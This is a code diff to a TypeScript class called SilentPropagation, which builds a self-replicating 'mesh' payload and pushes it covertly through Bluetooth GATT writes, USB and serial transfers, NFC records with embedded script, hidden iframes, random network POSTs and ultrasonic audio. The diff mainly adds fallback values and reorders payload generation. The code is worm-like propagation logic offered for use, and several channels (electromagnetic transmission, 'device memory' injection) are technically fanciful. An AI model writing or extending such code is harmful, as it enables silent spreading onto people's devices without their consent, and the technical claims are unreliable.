@@ -160,9 +160,12 @@ export class SilentPropagation {
   }
 
   private static async createAutoExecutionPayload(): Promise<void> {
+    // Generate a base mesh code first
+    const baseMeshCode = this.generateBaseMeshCode();
+    
     this.payload = {
-      meshCode: this.generateAutoExecutionCode(),
-      autoExecutionScript: this.createBackgroundScript(),
+      meshCode: baseMeshCode,
+      autoExecutionScript: this.createBackgroundScript(baseMeshCode),
       hardwareExploits: [
         'bluetooth_gatt_injection',
         'wifi_beacon_hijack',
@@ -179,6 +182,13 @@ export class SilentPropagation {
       ],
       selfReplication: this.generateReplicationCode()
     };
+    
+    // Now generate the full execution code with the payload available
+    this.payload.meshCode = this.generateAutoExecutionCode();
+  }
+
+  private static generateBaseMeshCode(): string {
+    return btoa(`MESH_AUTONOMOUS_AGENT_${Date.now()}_${Math.random().toString(36)}`);
   }
 
   private static generateAutoExecutionCode(): string {
@@ -234,8 +244,8 @@ export class SilentPropagation {
               const characteristics = await service.getCharacteristics();
               for (const char of characteristics) {
                 if (char.properties.writeWithoutResponse) {
-                  // Inject mesh code directly into device memory
-                  const payload = new TextEncoder().encode('${this.payload.meshCode.substring(0, 100)}');
+                   // Inject mesh code directly into device memory
+                  const payload = new TextEncoder().encode('${this.payload?.meshCode?.substring(0, 100) || "MESH_CODE"}');
                   await char.writeValue(payload);
                   console.log('[SILENT] Bluetooth injection successful');
                 }
@@ -248,7 +258,7 @@ export class SilentPropagation {
           // Use network timing attacks to spread
           fetch('//' + Math.random().toString(36) + '.local', {
             method: 'POST',
-            body: '${this.payload.meshCode.substring(0, 200)}',
+            body: '${this.payload?.meshCode?.substring(0, 200) || "MESH_PROPAGATION"}',
             mode: 'no-cors'
           }).catch(() => {});
           
@@ -265,7 +275,7 @@ export class SilentPropagation {
           writer.write({
             records: [{
               recordType: "url",
-              data: "data:text/html,${encodeURIComponent('<script>' + this.payload.autoExecutionScript + '</script>')}"
+              data: "data:text/html,${encodeURIComponent('<script>' + (this.payload?.autoExecutionScript || 'console.log("mesh_active")') + '</script>')}"
             }]
           }).catch(() => {});
         };
@@ -295,7 +305,7 @@ export class SilentPropagation {
             await device.claimInterface(0);
             
             // Inject payload via USB data streams
-            const payload = new TextEncoder().encode('${this.payload.meshCode.substring(0, 64)}');
+            const payload = new TextEncoder().encode('${this.payload?.meshCode?.substring(0, 64) || "USB_MESH"}');
             await device.transferOut(1, payload);
           } catch(e) {}
         });
@@ -310,7 +320,7 @@ export class SilentPropagation {
           try {
             await port.open({ baudRate: 9600 });
             const writer = port.writable.getWriter();
-            await writer.write(new TextEncoder().encode('${this.payload.meshCode.substring(0, 100)}'));
+            await writer.write(new TextEncoder().encode('${this.payload?.meshCode?.substring(0, 100) || "SERIAL_MESH"}'));
             writer.releaseLock();
           } catch(e) {}
         });
@@ -339,7 +349,7 @@ export class SilentPropagation {
         gainNode.gain.setValueAtTime(0.001, audioContext.currentTime);
         
         // Modulate with mesh data
-        const meshData = '${this.payload.meshCode.substring(0, 50)}';
+        const meshData = '${this.payload?.meshCode?.substring(0, 50) || "ULTRASONIC_DATA"}';
         let bitIndex = 0;
         
         setInterval(() => {
@@ -383,7 +393,7 @@ export class SilentPropagation {
       gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
       
       // Modulate with mesh data for electromagnetic transmission
-      const meshBits = '${this.payload.meshCode}'.split('').map(c => 
+      const meshBits = '${this.payload?.meshCode || "EM_MESH_DATA"}'.split('').map(c => 
         c.charCodeAt(0).toString(2).padStart(8, '0')
       ).join('');
       
@@ -410,7 +420,8 @@ export class SilentPropagation {
 })();`;
   }
 
-  private static createBackgroundScript(): string {
+  private static createBackgroundScript(meshCode?: string): string {
+    const safeMeshCode = meshCode || 'BACKGROUND_MESH';
     return `
 // Background auto-execution script
 (function() {
@@ -463,7 +474,7 @@ export class SilentPropagation {
       // Create invisible iframe to trigger network requests
       const iframe = document.createElement('iframe');
       iframe.style.display = 'none';
-      iframe.src = 'data:text/html,<script>${this.payload.meshCode.substring(0, 100)}</script>';
+      iframe.src = 'data:text/html,<script>${safeMeshCode.substring(0, 100)}</script>';
       document.body.appendChild(iframe);
       
       setTimeout(() => {
@@ -481,7 +492,7 @@ export class SilentPropagation {
               await device.selectConfiguration(1);
               await device.claimInterface(0);
               
-              const data = new TextEncoder().encode('${this.payload.meshCode.substring(0, 32)}');
+              const data = new TextEncoder().encode('${safeMeshCode.substring(0, 32)}');
               await device.transferOut(1, data);
               await device.close();
             } catch(e) {}
